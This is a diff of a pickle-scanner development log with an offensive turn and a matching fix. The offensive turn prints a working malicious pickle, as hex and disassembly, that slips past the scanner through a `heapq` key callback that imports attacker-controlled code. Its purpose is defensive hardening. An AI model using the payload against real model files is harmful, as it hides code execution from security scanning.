@@ -18937,3 +18937,203 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3852 passed, 1022 skipped, 21 warnings in 53.00s
 ```
+
+## Turn 279 - Bypass via `heapq` key callback dispatch
+
+Offensive turn after the Turn 278 defense. The new eager stdlib consumer table
+models `heapq.nlargest(n, iterable, key)` as consuming the iterable argument,
+but it does not model the separate `key` callback that `heapq` invokes for each
+item. A clean pickle can pass `builtins.help` as the positional key function,
+causing `_sitebuiltins._Helper.__call__` to import attacker-controlled `pydoc`.
+
+Representative payload:
+
+```python
+heapq.nlargest(1, ("owned-value",), builtins.help)
+```
+
+The shadow `pydoc.py` writes a marker at import time and defines `help(...)` to
+return `0`, so the `key` callback succeeds and `nlargest(...)` returns normally.
+
+```text
+payload_len 57
+payload_hex 80048c0568656170718c086e6c61726765737493284b018c0b6f776e65642d76616c7565858c086275696c74696e738c0468656c709374522e
+
+0: PROTO              4
+19: STACK_GLOBAL       # heapq.nlargest
+21: BININT1            1
+23: SHORT_BINUNICODE   'owned-value'
+36: TUPLE1             # non-empty iterable
+53: STACK_GLOBAL       # builtins.help key callback
+55: REDUCE             # heapq.nlargest(1, tuple, help), invokes key(item)
+56: STOP
+```
+
+Scanner proof:
+
+```text
+scan clean findings 0 errors ()
+imports [
+  ('heapq', 'nlargest', 19, False),
+  ('builtins', 'help', 53, False),
+]
+invocations [
+  ('heapq', 'nlargest', 3, 55),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type list
+runtime_repr ['owned-value']
+marker_exists True
+marker_text owned-by-heapq-nlargest-key
+```
+
+Sibling clean bypass:
+
+```text
+heapq.nsmallest(1, ("owned-value",), builtins.help)
+payload_len 58
+scan clean findings 0
+runtime list ['owned-value'] True owned-by-heapq-nsmallest-key
+```
+
+Why it bypasses:
+
+- Turn 278 modeled the iterable consumption side of `heapq.nlargest` and
+  `heapq.nsmallest`, but only when argument 1 is itself a tracked call iterator.
+- Here the iterable is an ordinary non-empty tuple, so no call-iterator
+  consumption path fires.
+- The dangerous callable is argument 2, the positional `key` function.
+  `heapq` invokes it with one item while building its ranking heap.
+- Native metadata records only the visible outer `heapq.nlargest(...)`
+  invocation and misses the hidden one-argument `builtins.help(item)` call.
+
+Likely source-level defense:
+
+- Add callback-dispatch modeling for `heapq.nlargest` and `heapq.nsmallest`
+  when arity is 3 and argument 2 is a callable reference.
+- Emit a one-argument invocation for the key callable at the reducer position.
+- To stay precise, gate the callback on an iterable argument that is definitely
+  non-empty, such as a tracked non-empty `Tuple`; call-iterator iterable cases
+  are already covered by the Turn 278 eager-consumer table.
+
+Simplification note:
+
+- This is a different call-graph shape than eager iterable consumption:
+  `(module, function, arity, callback_arg_index, callback_arg_count,
+  non_empty_iterable_arg_index)`.
+- A small exact callback-dispatch table can keep these finite callback surfaces
+  out of package-wide policy blocks while preserving performance.
+
+Performance note:
+
+- The representative payload is 57 bytes.
+- Warm scan timing over 1000 runs was median `0.000039s`, p95 `0.000041s`,
+  and max `0.000355s`.
+
+## Turn 280 - Block `heapq` key callback dispatch
+
+Defensive turn for the Turn 279 `heapq.nlargest(..., builtins.help)` bypass.
+The fix adds a source-level callback-dispatch model separate from iterable
+consumption: `heapq` invokes the positional `key` callback once per item, so the
+scanner now records that hidden callback invocation when the iterable is
+definitely non-empty.
+
+Focused change:
+
+```text
+heapq.nlargest(n, non_empty_iterable, key_callable) -> key_callable(item)
+heapq.nsmallest(n, non_empty_iterable, key_callable) -> key_callable(item)
+```
+
+Boundary kept:
+
+```text
+heapq.nlargest(n, empty_tuple, key_callable) -> does not call key_callable
+heapq.nsmallest(n, empty_tuple, key_callable) -> does not call key_callable
+```
+
+Implementation note:
+
+- Added `EXACT_ARITY_CALLBACK_DISPATCH_CONSUMERS`, a compact
+  `(module, name, arity, callback_arg_index, callback_arg_count,
+  non_empty_iterable_arg_index)` table.
+- Added `callback_dispatch_invocations(...)` alongside existing protocol,
+  call-iterator, and defaultdict factory hidden-invocation modeling.
+- The first entries are `heapq.nlargest` and `heapq.nsmallest` with arity 3,
+  callback argument 2, callback arity 1, and non-empty iterable argument 1.
+- The non-empty gate currently accepts tracked non-empty tuples, strings, and
+  bytes-like literals. Empty tuples are left clean and runtime-proven.
+
+Post-fix proof for the Turn 279 representative payload:
+
+```text
+payload_len 57
+scan malicious findings 1 errors ()
+imports [
+  ('heapq', 'nlargest', 19),
+  ('builtins', 'help', 53),
+]
+invocations [
+  ('heapq', 'nlargest', 3, 55),
+  ('builtins', 'help', 1, 55),
+]
+finding DANGEROUS_CALL_GRAPH {
+  'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__', 'builtins.__import__'),
+}
+runtime_rc 0
+runtime_type list
+runtime_repr ['owned-value']
+marker_exists True
+marker_text owned-by-heapq-nlargest-key
+```
+
+Regression coverage:
+
+- Added malicious positives for `heapq.nlargest` and `heapq.nsmallest` with a
+  non-empty tuple and `builtins.help` key callback.
+- Added clean runtime-proven negatives for both functions with an empty tuple,
+  verifying the key callback is not called.
+
+Simplification note:
+
+- This introduces the second reusable exact table shape after fixed-arity
+  iterable consumption: callback dispatch with a callback slot and observed
+  callback arity. Future callback surfaces can add table rows instead of
+  package-wide policy entries.
+
+Performance note:
+
+- Warm post-fix scan timing over 1000 runs: median `0.000092s`, p95
+  `0.000095s`, max `0.000103s`.
+- The callback table is checked only after reducer arguments are decoded and is
+  gated by exact module/name/arity.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted heapq key callback regressions
+4 passed in 0.43s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+141 passed in 3.37s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+179 passed in 4.78s
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3856 passed, 1022 skipped, 21 warnings in 51.38s
+```
